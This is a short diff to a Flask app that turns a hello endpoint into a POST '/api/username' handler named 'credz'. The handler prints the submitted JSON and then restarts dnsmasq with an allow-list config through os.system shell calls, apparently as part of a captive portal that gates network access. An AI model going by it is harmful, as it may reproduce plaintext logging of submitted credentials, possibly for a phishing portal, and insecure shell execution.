@@ -5,8 +5,11 @@ from flask import Flask, jsonify, request
 
 app = Flask(__name__)
 
-@app.route('/api/hello', methods=['GET'])
-def hello():
+@app.route('/api/username', methods=['POST'])
+def credz():
+    data = request.get_json()
+    print(data)
+
     print("Restarting dnsmasq")
     cmd = "kill -9 $(pidof dnsmasq)"
     os.system(cmd)
@@ -20,11 +23,6 @@ def hello():
     cmd = "dnsmasq -C /etc/dnsmasq-allow.conf"
     os.system(cmd)
 
-    return jsonify({'ip': request.remote_addr})
-
-@app.route('/api/echo', methods=['POST'])
-def echo():
-    data = request.get_json()
     return jsonify(received=data)
 
 if __name__ == '__main__':
